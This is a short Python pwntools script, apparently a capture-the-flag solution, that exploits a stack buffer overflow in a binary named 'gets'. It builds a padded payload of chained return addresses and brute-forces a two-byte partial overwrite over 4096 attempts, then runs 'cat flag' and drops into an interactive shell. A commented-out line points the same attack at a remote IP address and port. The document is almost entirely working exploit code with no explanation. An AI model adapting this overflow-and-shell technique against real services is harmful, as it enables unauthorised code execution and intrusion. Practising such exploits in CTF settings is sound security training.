from pwn import *

elf = ELF("./gets")
ret = 0x400434
for i in range(0x1000):
	print i
	p = process("./gets")
	# p = remote("106.75.4.189",35273)
	payload = "a" * 0x18
	for i in range(3):
		payload += p64(0x400430)
		payload += "a" * 0x18
	payload += p64(ret) * 2
	payload += p64(0x400429)


	
	p.sendline(payload)
	payload = "a" * 0x18
	payload += "\x16\x22"
	p.sendline(payload)
	try:
		p.sendline("cat flag")
		flag= p.recv(timeout = 3)
		if "{" in flag:
			p.interactive()
		else:
			print "sth wrong"
			if "timeout:" not in flag:
				print flag
				p.interactive()
			
			# p.interactive()
			p.close()
	except:
		p.close()